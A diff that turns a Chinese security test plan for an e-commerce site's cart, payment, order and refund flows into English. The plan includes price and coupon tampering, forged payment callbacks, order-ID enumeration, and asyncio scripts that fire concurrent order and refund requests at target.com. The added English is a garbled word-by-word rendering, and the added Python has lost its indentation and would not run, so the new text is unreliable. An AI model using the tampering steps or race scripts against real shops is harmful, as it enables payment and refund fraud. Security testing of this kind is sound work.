@@ -1,683 +1,683 @@
-# 电商平台支付与订单流程安全测试方案
+# electronic commercePlatformPaymentandOrderflow processSecureTest Plan
 
-## 一、测试范围与目标
+## 1. Test ScopeandTarget
 
-### 1.1 测试范围
+### 1.1 Test Scope
 
-| 模块 | 子功能 | 风险等级 |
+| model block | sub function can | Risk Level |
 |------|--------|---------|
-| 购物车 | 添加商品、修改数量、价格计算、库存校验 | 中 |
-| 在线支付 | 支付宝支付、微信支付、支付回调、支付状态同步 | 极高 |
-| 订单管理 | 订单创建、状态流转、订单查询、订单篡改 | 高 |
-| 退款流程 | 退款申请、退款审核、退款到账、重复退款 | 极高 |
+| Shopping Cart | Addcommerce product/Modifynumber quantity/price formatCompute/InventoryValidate | in |
+| Online Payment | AlipayPayment/WeChatPayment/PaymentCallback/PaymentStatussame step | Critical |
+| Order Management | OrderCreate/Statusflow transfer/Ordercheck query/Order Tampering | High |
+| Refund Flow | Refund please/Refundaudit audit/Refundtoaccount/Duplicate Refund | Critical |
 
-### 1.2 测试目标
+### 1.2 Test Objective
 
-- 验证支付金额不可被客户端篡改
-- 验证订单状态机流转的完整性和不可逆性
-- 验证退款逻辑不存在重复退款、超额退款漏洞
-- 验证支付回调的签名校验和幂等性
-- 验证业务逻辑中的竞态条件（Race Condition）防护
-- 验证越权访问控制（水平越权 + 垂直越权）
-
----
-
-## 二、购物车安全测试
-
-### 2.1 价格篡改测试
-
-**测试编号**: CART-001
-**风险等级**: 极高
-**测试目标**: 验证服务端是否以数据库价格为准，而非信任客户端传入价格
-
-**测试步骤**:
-1. 正常添加商品到购物车，使用 Burp Suite 拦截请求
-2. 修改请求中的 `price` 字段（如 100.00 改为 0.01）
-3. 提交订单，观察实际结算金额
-4. 检查是否存在隐藏的 `unit_price`、`total_price`、`amount` 等可篡改字段
-5. 在结算页面再次拦截请求，修改最终提交的金额字段
-
-**预期结果**: 服务端应忽略客户端传入的价格，始终从数据库读取商品当前价格
-
-**验证方法**:
-- 对比订单表中记录的金额与商品表中的实际价格
-- 检查支付请求发送给支付宝/微信的金额是否与订单金额一致
+- ValidatePaymentAmountnotCanbeClienttamper change
+- ValidateOrder State Machineflow transferofCompletenessandnotCan ness
+- ValidateRefundlogic logic not existinDuplicate Refund/super amountRefundvulnerability
+- ValidatePaymentCallbackofSignatureValidateandIdempotencyness
+- Validatebusiness logic logicinofRace Condition(Race Condition)defense protect
+- ValidateAuthorization Bypasscontrol make(Horizontal Authorization Bypass + Vertical Authorization Bypass)
 
 ---
 
-### 2.2 数量溢出测试
+## 2. Shopping CartSecuretest
 
-**测试编号**: CART-002
-**风险等级**: 高
-**测试目标**: 验证商品数量的边界值处理
+### 2.1 price format tamper change test
 
-**测试步骤**:
-1. 将商品数量修改为负数（如 `-1`），观察是否产生负金额订单
-2. 将数量修改为 `0`，观察是否允许创建零金额订单
-3. 将数量修改为超大整数（如 `2147483647`、`99999999`），观察是否整数溢出
-4. 将数量修改为小数（如 `0.001`），观察服务端处理
-5. 将数量修改为特殊值（如 `NaN`、`Infinity`、`null`）
+**Test ID**: CART-001
+**Risk Level**: Critical
+**Test Objective**: ValidateServerwhetherasDatabaseprice formatasaccurate, whileNon-information anyClientpass inject price format
 
-**预期结果**: 服务端应校验数量为正整数，且不超过库存上限和业务上限
+**Test Steps**:
+1. correct commonAddcommerce producttoShopping Cart, useuse Burp Suite InterceptRequest
+2. ModifyRequestinof `price` Field(such as 100.00 changeas 0.01)
+3. SubmitOrder, Observereal actual result algorithmAmount
+4. Checkwhether existshidden hiddenof `unit_price`/`total_price`/`amount` etc.Cantamper changeField
+5. inresult algorithm page againtimesInterceptRequest, Modifymost finalSubmitofAmountField
+
+**Expected Result**: ServershouldignoreClientpass injectofprice format, initial finalfromDatabaseReadcommerce product when first price format
+
+**ValidateMethod**:
+- for ratioOrdertableinRecordofAmountandcommerce product tableinofreal actual price format
+- CheckPaymentRequestSendtoAlipay/WeChatofAmountwhetherandOrderAmountone cause
 
 ---
 
-### 2.3 库存竞态条件测试
+### 2.2 number quantity out test
 
-**测试编号**: CART-003
-**风险等级**: 高
-**测试目标**: 验证并发下单时的库存扣减是否存在超卖
+**Test ID**: CART-002
+**Risk Level**: High
+**Test Objective**: Validatecommerce product number quantityofboundary boundary value handle manage
 
-**测试步骤**:
-1. 选择一个库存为 1 的商品
-2. 使用脚本并发发送 50 个下单请求（同一商品，数量 1）
-3. 检查最终成功创建的订单数量
-4. 检查库存是否变为负数
+**Test Steps**:
+1. willcommerce product number quantityModifyasNegative Number(such as `-1`), Observewhetherasset generate negativeAmountOrder
+2. willnumber quantityModifyas `0`, Observewhetherallow allowCreatezeroAmountOrder
+3. willnumber quantityModifyassuper large integer number(such as `2147483647`/`99999999`), Observewhetherinteger number out
+4. willnumber quantityModifyassmall number(such as `0.001`), ObserveServerhandle manage
+5. willnumber quantityModifyasspecial value(such as `NaN`/`Infinity`/`null`)
 
-**并发脚本示例**:
+**Expected Result**: ServershouldValidatenumber quantityascorrect integer number, and not super throughInventoryabove limitandbusiness above limit
+
+---
+
+### 2.3 InventoryRace Conditiontest
+
+**Test ID**: CART-003
+**Risk Level**: High
+**Test Objective**: ValidateConcurrencyunder single timeofInventorydeduct reducewhether existssuper
+
+**Test Steps**:
+1. select oneInventoryas 1 ofcommerce product
+2. useuseScriptConcurrencySend 50 under singleRequest(Samecommerce product, number quantity 1)
+3. Checkmost finalSuccessCreateofOrdernumber quantity
+4. CheckInventorywhetherchangeasNegative Number
+
+**ConcurrencyScriptExample**:
 ```python
 import asyncio
 import aiohttp
 
 async def place_order(session, url, headers, payload):
-    async with session.post(url, json=payload, headers=headers) as resp:
-        return await resp.json()
+ async with session.post(url, json=payload, headers=headers) as resp:
+ return await resp.json()
 
 async def main():
-    url = "https://target.com/api/order/create"
-    headers = {"Authorization": "Bearer <token>", "Content-Type": "application/json"}
-    payload = {"product_id": "SKU001", "quantity": 1}
+ url = "https://target.com/api/order/create"
+ headers = {"Authorization": "Bearer <token>", "Content-Type": "application/json"}
+ payload = {"product_id": "SKU001", "quantity": 1}
 
-    async with aiohttp.ClientSession() as session:
-        tasks = [place_order(session, url, headers, payload) for _ in range(50)]
-        results = await asyncio.gather(*tasks)
-        success = [r for r in results if r.get("code") == 200]
-        print(f"成功订单数: {len(success)}")
+ async with aiohttp.ClientSession() as session:
+ tasks = [place_order(session, url, headers, payload) for _ in range(50)]
+ results = await asyncio.gather(*tasks)
+ success = [r for r in results if r.get("code") == 200]
+ print(f"SuccessOrdernumber: {len(success)}")
 
 asyncio.run(main())
 ```
 
-**预期结果**: 仅 1 个订单成功，其余应返回库存不足
+**Expected Result**: only 1 OrderSuccess, other shouldReturnInventoryInsufficient
 
 ---
 
-### 2.4 优惠券/折扣逻辑测试
+### 2.4 Coupon/discount deduct logic logic test
 
-**测试编号**: CART-004
-**风险等级**: 高
-**测试目标**: 验证优惠券使用的安全性
+**Test ID**: CART-004
+**Risk Level**: High
+**Test Objective**: ValidateCouponuseuseofSecureness
 
-**测试步骤**:
-1. 使用一张优惠券下单，拦截请求获取优惠券ID
-2. 取消订单后，再次使用同一优惠券ID下单（测试优惠券是否正确回滚和防重用）
-3. 修改优惠券面额字段（如 `discount_amount` 从 10 改为 1000）
-4. 同一订单叠加使用多张同类优惠券（修改请求中的 `coupon_ids` 数组）
-5. 使用其他用户的优惠券ID（水平越权）
-6. 将优惠金额设为大于商品总价的值，检查是否产生负数应付金额
-7. 并发使用同一张优惠券创建多个订单
+**Test Steps**:
+1. useuseoneitemsCouponunder single, InterceptRequestObtainCouponID
+2. CancelOrderafter, againtimesuseuseSameCouponIDunder single(testCouponwhethercorrect confirm return anddefense serioususe)
+3. ModifyCouponpage amountField(such as `discount_amount` from 10 changeas 1000)
+4. SameOrder add useusemanyitemssame typeCoupon(ModifyRequestinof `coupon_ids` number array)
+5. useuseotherUserofCouponID(Horizontal Authorization Bypass)
+6. willpriority Amountsetasgreater thancommerce product total priceofvalue, Checkwhetherasset generateNegative NumbershouldpayAmount
+7. ConcurrencyuseuseSameitemsCouponCreatemanyOrder
 
-**预期结果**:
-- 优惠券面额由服务端计算，不信任客户端
-- 同一优惠券不可重复使用
-- 不可使用他人优惠券
-- 应付金额不应为负数
-
----
-
-## 三、支付流程安全测试
-
-### 3.1 支付金额篡改测试
-
-**测试编号**: PAY-001
-**风险等级**: 极高
-**测试目标**: 验证从订单创建到支付请求全链路的金额一致性
-
-**测试步骤**:
-1. 创建订单（假设金额 500 元），进入支付页面
-2. 拦截前端向后端发送的"创建支付单"请求
-3. 修改请求中的 `total_amount` / `total_fee` 字段为 `0.01`
-4. 观察后端返回的支付宝/微信预支付参数中的金额
-5. 如果后端返回了支付链接/二维码，解析其中的金额参数
-6. 直接构造对支付宝/微信支付接口的请求，替换金额参数
-
-**预期结果**: 后端在创建支付单时，应从订单表中读取金额，忽略客户端传入值
-
-**深度验证**:
-- 检查代码中 `alipay.trade.create` / `wxpay.unifiedorder` 的 `total_amount` 来源
-- 确认是 `order.total_amount` 而非 `request.body.amount`
+**Expected Result**:
+- Couponpage amount byServerCompute, not information anyClient
+- SameCouponnotCanserious repeat useuse
+- notCanuseuseother personCoupon
+- shouldpayAmountshould notasNegative Number
 
 ---
 
-### 3.2 支付回调伪造测试
+## 3. Paymentflow processSecuretest
 
-**测试编号**: PAY-002
-**风险等级**: 极高
-**测试目标**: 验证支付成功回调（notify_url）的安全性
+### 3.1 Payment Amount Tamperingtest
 
-**测试步骤**:
+**Test ID**: PAY-001
+**Risk Level**: Critical
+**Test Objective**: ValidatefromOrderCreatetoPaymentRequestall link routeofAmountone cause ness
 
-#### 3.2.1 签名校验测试
-1. 获取一个真实的支付宝/微信回调请求样本（通过正常支付流程抓包）
-2. 修改回调中的 `trade_status` 为 `TRADE_SUCCESS`，但不重新签名
-3. 直接 POST 到系统的 `notify_url` 端点
-4. 观察订单状态是否被修改为已支付
+**Test Steps**:
+1. Create Order(false setAmount 500 yuan), advance injectPaymentpage
+2. InterceptFrontendtowardBackendSendof"CreatePaymentsingle"Request
+3. ModifyRequestinof `total_amount` / `total_fee` Fieldas `0.01`
+4. ObserveBackendReturnofAlipay/WeChatexpectedPaymentParameterinofAmount
+5. such asifBackendReturndonePaymentlink connect/two maintain code, decode Among themofAmountParameter
+6. Directstructure forge forAlipay/WeChatPaymentInterfaceofRequest, ReplaceAmountParameter
 
-#### 3.2.2 回调重放测试
-1. 捕获一个合法的支付成功回调请求（含有效签名）
-2. 原封不动重放该请求 10 次
-3. 检查是否触发了重复的业务处理（如重复发货、重复加积分）
+**Expected Result**: BackendinCreatePaymentsingle time, shouldfromOrdertableinReadAmount, ignoreClientpass inject value
 
-#### 3.2.3 回调参数篡改测试
-1. 构造回调请求，将 `out_trade_no`（商户订单号）替换为另一个未支付订单的编号
-2. 保持 `trade_no`（支付平台交易号）为已支付订单的交易号
-3. 观察系统是否将未支付订单标记为已支付
-
-#### 3.2.4 来源IP验证测试
-1. 从非支付宝/微信官方IP段发送回调请求
-2. 检查系统是否校验了回调来源IP
-
-**预期结果**:
-- 必须验证签名，无签名或签名错误的回调直接拒绝
-- 必须实现幂等处理，重复回调不重复执行业务逻辑
-- 必须校验 `out_trade_no` 与 `trade_no` 的对应关系
-- 建议校验来源IP白名单
+**deep degreeValidate**:
+- CheckCodein `alipay.trade.create` / `wxpay.unifiedorder` of `total_amount` come source
+- Confirmis `order.total_amount` whileNon- `request.body.amount`
 
 ---
 
-### 3.3 支付状态轮询篡改测试
+### 3.2 Payment Callback Forgerytest
 
-**测试编号**: PAY-003
-**风险等级**: 高
-**测试目标**: 验证前端轮询支付状态的安全性
+**Test ID**: PAY-002
+**Risk Level**: Critical
+**Test Objective**: ValidatePaymentSuccessCallback(notify_url)ofSecureness
 
-**测试步骤**:
-1. 创建订单但不实际支付
-2. 拦截前端轮询支付状态的请求（如 `GET /api/order/payment-status?order_id=xxx`）
-3. 修改响应中的 `status` 从 `pending` 为 `paid`
-4. 观察前端是否直接跳转到"支付成功"页面并触发后续流程
-5. 检查后端是否有独立的支付状态确认机制（如主动查询支付宝/微信订单状态）
+**Test Steps**:
 
-**预期结果**: 前端展示可被篡改，但后端必须通过回调或主动查询确认支付状态，不依赖前端上报
+#### 3.2.1 SignatureValidatetest
+1. Obtainone real realofAlipay/WeChatCallbackRequest version(Passcorrect commonPaymentflow process packet capture)
+2. ModifyCallbackinof `trade_status` as `TRADE_SUCCESS`, but not serious newSignature
+3. Direct POST toSystemof `notify_url` Endpoint
+4. ObserveOrderStatuswhetherbeModifyasPaid
 
----
+#### 3.2.2 CallbackReplaytest
+1. one combine methodofPaymentSuccessCallbackRequest(includeValidSignature)
+2. principle not dynamicReplaythisRequest 10 times
+3. Checkwhethertrigger initiate done serious repeatofbusiness handle manage(such asserious repeat shipping/serious repeat add part)
 
-### 3.4 支付超时与订单关闭测试
+#### 3.2.3 CallbackParametertamper change test
+1. structure forgeCallbackRequest, will `out_trade_no`(commerce accountOrdernumber)Replaceas one notPaymentOrderofID
+2. protect hold `trade_no`(PaymentPlatformtransaction easy number)asPaidOrderoftransaction easy number
+3. ObserveSystemwhetherwillnotPaymentOrderidentifier recordasPaid
 
-**测试编号**: PAY-004
-**风险等级**: 中
-**测试目标**: 验证支付超时后订单关闭的安全性
+#### 3.2.4 come sourceIPValidatetest
+1. fromNon-Alipay/WeChat methodIPSendCallbackRequest
+2. CheckSystemwhetherValidatedoneCallbackcome sourceIP
 
-**测试步骤**:
-1. 创建订单，获取支付链接/二维码
-2. 等待订单超时关闭（或手动触发关闭）
-3. 使用之前获取的支付链接/二维码尝试完成支付
-4. 如果支付宝/微信侧支付成功，检查系统是否能正确处理这种"已关闭订单收到支付成功回调"的情况
-5. 检查是否有自动退款机制处理此类异常
-
-**预期结果**:
-- 订单关闭后应调用支付平台的关单接口
-- 如果关单后仍收到支付成功回调，应自动发起退款
-- 不应出现"用户付了钱但订单已关闭"的资金悬挂状态
-
----
-
-### 3.5 支付方式切换测试
-
-**测试编号**: PAY-005
-**风险等级**: 中
-**测试目标**: 验证切换支付方式时的安全性
-
-**测试步骤**:
-1. 选择支付宝支付，获取支付参数
-2. 不完成支付，切换为微信支付
-3. 检查是否为同一订单生成了多个支付单
-4. 用支付宝的旧支付参数完成支付
-5. 再用微信的支付参数也完成支付
-6. 检查是否出现一个订单被支付两次的情况
-
-**预期结果**: 切换支付方式时应关闭/作废之前的支付单，确保一个订单只能被支付一次
+**Expected Result**:
+- mustValidateSignature, noSignatureorSignatureerrorofCallbackDirectreject reject
+- mustreal currentIdempotencyhandle manage, serious repeatCallbacknot serious repeatExecutebusiness logic logic
+- mustValidate `out_trade_no` and `trade_no` offorshouldkey system
+- create protocolValidatecome sourceIPWhitelist
 
 ---
 
-### 3.6 签名与加密测试
+### 3.3 PaymentStatusrotate query tamper change test
 
-**测试编号**: PAY-006
-**风险等级**: 极高
-**测试目标**: 验证与支付平台通信的签名机制安全性
+**Test ID**: PAY-003
+**Risk Level**: High
+**Test Objective**: ValidateFrontendrotate queryPaymentStatusofSecureness
 
-**测试步骤**:
-1. 检查支付宝集成是否使用 RSA2（SHA256WithRSA）而非 RSA（SHA1WithRSA）
-2. 检查微信支付是否使用 V3 签名（AEAD_AES_256_GCM）而非已废弃的 MD5 签名
-3. 检查私钥/证书是否硬编码在源代码中
-4. 检查私钥文件权限是否为 600
-5. 检查是否存在签名绕过的逻辑（如 `if sign == "" { skip_verify }` 这类代码）
-6. 检查日志中是否打印了敏感的签名密钥或支付参数
+**Test Steps**:
+1. Create Orderbut not real actualPayment
+2. InterceptFrontendrotate queryPaymentStatusofRequest(such as `GET /api/order/payment-status?order_id=xxx`)
+3. ModifyResponseinof `status` from `pending` as `paid`
+4. ObserveFrontendwhetherDirectskip transferto"PaymentSuccess"page and trigger initiate after continue flow process
+5. CheckBackendwhether hasindependent standaloneofPaymentStatusConfirmmachine make(such asprimary dynamic check queryAlipay/WeChatOrderStatus)
 
-**预期结果**:
-- 使用最新的签名算法
-- 密钥不在源码中硬编码，通过环境变量或密钥管理服务加载
-- 签名验证无绕过路径
+**Expected Result**: Frontend showCanbe tamper change, butBackendmustPassCallbackorprimary dynamic check queryConfirmPaymentStatus, not depend relyFrontendabove report
 
 ---
 
-## 四、订单管理安全测试
+### 3.4 Paymentsuper timeandOrderkey close test
 
-### 4.1 订单越权访问测试
+**Test ID**: PAY-004
+**Risk Level**: in
+**Test Objective**: ValidatePaymentsuper time afterOrderkey closeofSecureness
 
-**测试编号**: ORDER-001
-**风险等级**: 高
-**测试目标**: 验证用户不能访问或操作他人订单
+**Test Steps**:
+1. Create Order, ObtainPaymentlink connect/two maintain code
+2. etc.pendingOrdersuper time key close(ormobile dynamic trigger initiate key close)
+3. useuseof firstObtainofPaymentlink connect/two maintain codeAttemptcompletePayment
+4. such asifAlipay/WeChatPaymentSuccess, CheckSystemwhethercan correct confirm handle manage this type"already key closeOrdercollecttoPaymentSuccessCallback"ofdetails
+5. check whether there isself dynamicRefundmachine make handle manage type abnormal common
 
-**测试步骤**:
-
-#### 4.1.1 水平越权 — 查看
-1. 用户 A 登录，获取自己的订单ID（如 `order_id=10001`）
-2. 修改请求中的 `order_id` 为用户 B 的订单（如 `order_id=10002`）
-3. 发送 `GET /api/order/detail?order_id=10002`
-4. 观察是否返回了用户 B 的订单详情
-
-#### 4.1.2 水平越权 — 操作
-1. 用户 A 尝试取消用户 B 的订单：`POST /api/order/cancel {"order_id": "10002"}`
-2. 用户 A 尝试对用户 B 的订单发起退款
-3. 用户 A 尝试修改用户 B 订单的收货地址
-
-#### 4.1.3 垂直越权
-1. 普通用户尝试调用管理员接口（如 `POST /api/admin/order/update-status`）
-2. 普通用户尝试将订单状态直接修改为"已发货"
-3. 检查管理后台的订单管理接口是否有独立的权限校验
-
-**预期结果**: 所有订单操作必须校验当前用户是否为订单所有者，管理接口必须校验管理员角色
+**Expected Result**:
+- Orderkey close aftershouldCallPaymentPlatformofkey singleInterface
+- such asif key single after still collecttoPaymentSuccessCallback, shouldself dynamic initiate initiateRefund
+- should notout current"Userpay done butOrderalready key close"ofresource funds Status
 
 ---
 
-### 4.2 订单号可预测性测试
+### 3.5 Paymentmethod mode switch change test
 
-**测试编号**: ORDER-002
-**风险等级**: 中
-**测试目标**: 验证订单号是否可被枚举或预测
+**Test ID**: PAY-005
+**Risk Level**: in
+**Test Objective**: Validateswitch changePaymentmethod mode timeofSecureness
 
-**测试步骤**:
-1. 连续创建 10 个订单，记录订单号
-2. 分析订单号的生成规则（是否为自增、时间戳、UUID 等）
-3. 如果为自增 ID，尝试遍历订单号获取其他用户的订单信息
-4. 如果包含时间戳，尝试预测下一个订单号
+**Test Steps**:
+1. select AlipayPayment, ObtainPaymentParameter
+2. not completePayment, switch changeasWeChatPayment
+3. Checkwhether isSameOrdergenerate complete done manyPaymentsingle
+4. useAlipayofoldPaymentParametercompletePayment
+5. againuseWeChatofPaymentParameter completePayment
+6. Checkwhetherout current oneOrderbePaymenttwotimesofdetails
 
-**预期结果**: 订单号应包含随机成分，不可被轻易枚举或预测；即使被猜到，也应有权限校验兜底
+**Expected Result**: switch changePaymentmethod mode timeshouldkey close/operation of firstofPaymentsingle, confirm protect oneOrdercan onlybePaymentonetimes
 
 ---
 
-### 4.3 订单状态机完整性测试
+### 3.6 Signatureandadd secret test
 
-**测试编号**: ORDER-003
-**风险等级**: 高
-**测试目标**: 验证订单状态流转不可被非法跳转
+**Test ID**: PAY-006
+**Risk Level**: Critical
+**Test Objective**: ValidateandPaymentPlatformwild informationofSignaturemachine makeSecureness
 
-**正常状态流转**:
+**Test Steps**:
+1. CheckAlipaycollect completewhetheruseuse RSA2(SHA256WithRSA)whileNon- RSA(SHA1WithRSA)
+2. CheckWeChatPaymentwhetheruseuse V3 Signature(AEAD_AES_256_GCM)whileNon-already of MD5 Signature
+3. Checkprivate /cert certificatewhetherhardEncodinginSource Codein
+4. Checkprivate FilePermissionwhether is 600
+5. Checkwhether existsSignatureBypassoflogic logic(such as `if sign == "" { skip_verify }` this typeCode)
+6. CheckLoginwhetherbreak done sensitive sensitiveofSignatureKeyorPaymentParameter
+
+**Expected Result**:
+- useusemost newofSignaturealgorithm method
+- Keynotinsource codeinhardEncoding, Passenvironment environment change quantityorKeymanage manage service add
+- SignatureValidatenoBypassPath
+
+---
+
+## 4. Order ManagementSecuretest
+
+### 4.1 OrderAuthorization Bypasstest
+
+**Test ID**: ORDER-001
+**Risk Level**: High
+**Test Objective**: ValidateUsercannotaccess askoroperation other personOrder
+
+**Test Steps**:
+
+#### 4.1.1 Horizontal Authorization Bypass - View
+1. User A Login, Obtainself ownofOrderID(such as `order_id=10001`)
+2. ModifyRequestinof `order_id` asUser B ofOrder(such as `order_id=10002`)
+3. Send `GET /api/order/detail?order_id=10002`
+4. ObservewhetherReturndoneUser B ofOrderdetailed details
+
+#### 4.1.2 Horizontal Authorization Bypass - operation
+1. User A AttemptCancelUser B ofOrder:`POST /api/order/cancel {"order_id": "10002"}`
+2. User A AttemptforUser B ofOrderinitiate initiateRefund
+3. User A AttemptModifyUser B Orderofcollect goodsAddress
+
+#### 4.1.3 Vertical Authorization Bypass
+1. Regular UserAttemptCallAdministratorInterface(such as `POST /api/admin/order/update-status`)
+2. Regular UserAttemptwillOrderStatusDirectModifyas"already shipping"
+3. Checkmanage manage backend consoleofOrder ManagementInterfacewhether hasindependent standaloneofPermissionValidate
+
+**Expected Result**: AllOrderoperationmustValidatewhen firstUserwhether isOrderAllperson, manage manageInterfacemustValidateAdministratorRole
+
+---
+
+### 4.2 OrdernumberPredictableness test
+
+**Test ID**: ORDER-002
+**Risk Level**: in
+**Test Objective**: ValidateOrdernumberwhetherCanbeEnumerationorprediction
+
+**Test Steps**:
+1. continuous continueCreate 10 Order, RecordOrdernumber
+2. AnalyzeOrdernumberofgenerate complete scale rule(whether isself increase/timestamp/UUID etc.)
+3. such asifasself increase ID, AttemptTraversalOrdernumberObtainotherUserofOrderinformation
+4. such asif include include timestamp, Attemptprediction under oneOrdernumber
+
+**Expected Result**: Ordernumbershouldinclude include machine complete part, notCanbe easyEnumerationorprediction;that is use be to, shouldhasPermissionValidate
+
+---
+
+### 4.3 Order State MachineCompleteness test
+
+**Test ID**: ORDER-003
+**Risk Level**: High
+**Test Objective**: ValidateOrderStatusflow transfer notCanbeNon-method skip transfer
+
+**correct commonStatusflow transfer**:
 ```
-待支付 → 已支付 → 待发货 → 已发货 → 已签收 → 已完成
-                                              ↓
-                                           退款中 → 已退款
-待支付 → 已取消
+Pending Payment -> Paid -> pending shipping -> already shipping -> already collect -> Completed
+ down
+ Refundin -> Refunded
+Pending Payment -> alreadyCancel
 ```
 
-**测试步骤**:
-1. 尝试将"待支付"订单直接修改为"已发货"状态
-2. 尝试将"已完成"订单回退为"待支付"状态
-3. 尝试将"已取消"订单重新激活为"待支付"
-4. 尝试将"已退款"订单修改为"已完成"
-5. 拦截状态更新请求，修改 `status` 字段为非法值（如 `-1`、`999`、`paid`）
-6. 检查是否存在直接暴露的状态更新 API（如 `POST /api/order/update {"status": "shipped"}`）
+**Test Steps**:
+1. Attemptwill"Pending Payment"OrderDirectModifyas"already shipping"Status
+2. Attemptwill"Completed"Orderreturn refundas"Pending Payment"Status
+3. Attemptwill"alreadyCancel"Orderserious new as"Pending Payment"
+4. Attemptwill"Refunded"OrderModifyas"Completed"
+5. InterceptStatusUpdateRequest, Modify `status` FieldasNon-method value(such as `-1`/`999`/`paid`)
+6. Checkwhether existsDirectexpose exposureofStatusUpdate API(such as `POST /api/order/update {"status": "shipped"}`)
 
-**预期结果**:
-- 服务端实现严格的状态机，只允许合法的状态转换
-- 状态更新通过业务操作触发（如"发货"操作），而非直接修改状态字段
-- 非法状态转换返回明确错误
-
----
-
-### 4.4 订单信息泄露测试
-
-**测试编号**: ORDER-004
-**风险等级**: 中
-**测试目标**: 验证订单API不会泄露敏感信息
-
-**测试步骤**:
-1. 查看订单详情 API 的响应，检查是否包含以下敏感信息：
-   - 完整的支付交易号
-   - 支付回调的原始数据
-   - 内部用户ID或数据库主键
-   - 其他用户的收货地址、手机号（未脱敏）
-   - 后端服务器内部信息（IP、数据库连接串等）
-2. 检查订单列表API是否可通过参数注入获取额外字段（如 `?fields=*` 或 `?include=payment_detail`）
-3. 检查错误响应中是否包含堆栈信息或SQL语句
-
-**预期结果**: API 仅返回前端展示所需字段，敏感信息脱敏处理，错误信息不泄露内部实现
+**Expected Result**:
+- Serverreal current severe formatofStatusmachine, only allow allow combine methodofStatustransfer change
+- StatusUpdatePassbusiness operation trigger initiate(such as"shipping"operation), whileNon-DirectModifyStatusField
+- Non-methodStatustransfer changeReturnclear confirm error
 
 ---
 
-## 五、退款流程安全测试
+### 4.4 OrderInformation Disclosuretest
 
-### 5.1 重复退款测试
+**Test ID**: ORDER-004
+**Risk Level**: in
+**Test Objective**: ValidateOrderAPInot DisclosureSensitive Information
 
-**测试编号**: REFUND-001
-**风险等级**: 极高
-**测试目标**: 验证同一订单不可被多次退款
+**Test Steps**:
+1. ViewOrderdetailed details API ofResponse, Checkwhetherinclude includethe followingSensitive Information:
+ - CompleteofPaymenttransaction easy number
+ - PaymentCallbackofprinciple initialData
+ - internal partUserIDorDatabaseprimary key
+ - otherUserofcollect goodsAddress/mobile number(not leak sensitive)
+ - BackendServerinternal part information(IP/Databasecontinuous connect stringetc.)
+2. CheckOrderlistAPIwhetherCanPassParameterinject injectObtainamount externalField(such as `?fields=*` or `?include=payment_detail`)
+3. CheckerrorResponseinwhetherinclude include stack stack informationorSQL
 
-**测试步骤**:
-1. 对一笔已支付订单发起退款申请
-2. 在退款处理中，并发发送 20 个退款请求（相同订单号）
-3. 检查实际退款次数和退款总金额
-4. 退款成功后，再次尝试对同一订单发起退款
-5. 检查退款记录表，是否存在重复记录
+**Expected Result**: API onlyReturnFrontend show needField, Sensitive Informationleak sensitive handle manage, error information notDisclosureinternal part real current
 
-**并发退款测试脚本**:
+---
+
+## 5. Refund FlowSecuretest
+
+### 5.1 Duplicate Refundtest
+
+**Test ID**: REFUND-001
+**Risk Level**: Critical
+**Test Objective**: ValidateSameOrdernotCanbe manytimesRefund
+
+**Test Steps**:
+1. for one entryPaidOrderinitiate initiateRefund please
+2. inRefundhandle managein, ConcurrencySend 20 RefundRequest(related sameOrdernumber)
+3. Checkreal actualRefundtimesnumberandRefundtotalAmount
+4. RefundSuccessafter, againtimesAttemptforSameOrderinitiate initiateRefund
+5. CheckRefundRecordtable, whether existsserious repeatRecord
+
+**ConcurrencyRefundtestScript**:
 ```python
 import asyncio
 import aiohttp
 
 async def refund(session, url, headers, payload):
-    async with session.post(url, json=payload, headers=headers) as resp:
-        return await resp.json()
+ async with session.post(url, json=payload, headers=headers) as resp:
+ return await resp.json()
 
 async def main():
-    url = "https://target.com/api/refund/create"
-    headers = {"Authorization": "Bearer <token>", "Content-Type": "application/json"}
-    payload = {"order_id": "ORDER_20260306_001", "reason": "不想要了"}
+ url = "https://target.com/api/refund/create"
+ headers = {"Authorization": "Bearer <token>", "Content-Type": "application/json"}
+ payload = {"order_id": "ORDER_20260306_001", "reason": "not need done"}
 
-    async with aiohttp.ClientSession() as session:
-        tasks = [refund(session, url, headers, payload) for _ in range(20)]
-        results = await asyncio.gather(*tasks)
-        success = [r for r in results if r.get("code") == 200]
-        print(f"成功退款次数: {len(success)}")
+ async with aiohttp.ClientSession() as session:
+ tasks = [refund(session, url, headers, payload) for _ in range(20)]
+ results = await asyncio.gather(*tasks)
+ success = [r for r in results if r.get("code") == 200]
+ print(f"SuccessRefundtimesnumber: {len(success)}")
 
 asyncio.run(main())
 ```
 
-**预期结果**: 无论并发多少次，同一订单仅退款一次，使用分布式锁或数据库唯一约束保证
+**Expected Result**: no commentConcurrencymany lesstimes, SameOrderonlyRefundonetimes, useuseDistributed LockorDatabaseunique constraint protect cert
 
 ---
 
-### 5.2 超额退款测试
+### 5.2 super amountRefundtest
 
-**测试编号**: REFUND-002
-**风险等级**: 极高
-**测试目标**: 验证退款金额不可超过实际支付金额
+**Test ID**: REFUND-002
+**Risk Level**: Critical
+**Test Objective**: ValidateRefundAmountnotCansuper through real actualPaymentAmount
 
-**测试步骤**:
-1. 对一笔 100 元的订单发起退款，拦截请求
-2. 将 `refund_amount` 修改为 `200`（超过订单金额）
-3. 将 `refund_amount` 修改为 `-50`（负数退款）
-4. 将 `refund_amount` 修改为 `0.001`（精度攻击）
-5. 对部分退款的订单（已退 60 元），再次退款 60 元（总计超过 100 元）
-6. 检查退款金额计算是否存在浮点精度问题（如 `0.1 + 0.2 != 0.3`）
+**Test Steps**:
+1. for one entry 100 yuanofOrderinitiate initiateRefund, InterceptRequest
+2. will `refund_amount` Modifyas `200`(super throughOrderAmount)
+3. will `refund_amount` Modifyas `-50`(Negative NumberRefund)
+4. will `refund_amount` Modifyas `0.001`(precision degree attack attack)
+5. for part partRefundofOrder(already refund 60 yuan), againtimesRefund 60 yuan(total plan super through 100 yuan)
+6. CheckRefundAmountComputewhether exists point precision degree ask problem(such as `0.1 + 0.2!= 0.3`)
 
-**预期结果**:
-- 退款金额由服务端校验，不信任客户端传入值
-- 累计退款金额不超过实际支付金额
-- 使用整数（分）或 Decimal 进行金额计算，避免浮点精度问题
-
----
-
-### 5.3 退款到账篡改测试
-
-**测试编号**: REFUND-003
-**风险等级**: 极高
-**测试目标**: 验证退款只能退到原支付账户
-
-**测试步骤**:
-1. 发起退款请求，检查是否存在 `refund_account` / `refund_to` 等字段
-2. 如果存在，尝试修改为其他支付宝/微信账号
-3. 检查退款接口是否允许指定退款方式（如原路退款被改为退到余额）
-4. 检查退款记录中的收款方是否与原支付方一致
-
